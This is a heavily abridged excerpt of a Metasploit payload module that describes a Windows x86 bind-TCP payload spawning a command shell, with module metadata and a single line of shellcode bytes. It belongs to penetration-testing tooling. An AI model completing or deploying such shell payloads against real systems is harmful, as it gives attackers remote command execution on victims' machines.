## 
#  $Id: shell_hadoken_bind_tcp.rb,v 1.6 2011-03-21 17:26:46-03 nbrito Exp $
##
...
module Metasploit3
	...
	def initialize(info = {})
		super(merge_info(info,
			...
			'Description'   => 'Listen for a connection and spawn a command shell (Hadoken)',
			'Author'        => [ 'Nelson Brito' ],
			'License'       => 'GPLv2',
			'Platform'      => 'win',
			'Arch'          => ARCH_X86,
			...
			'Payload'       =>
				{
					...
					'Payload' =>
						...
						"\x61\xFF\xD5\xE8\x07\x00\x00\x00\x43\x4D\x44\x20\x2F\x6B\x00\x5B" +
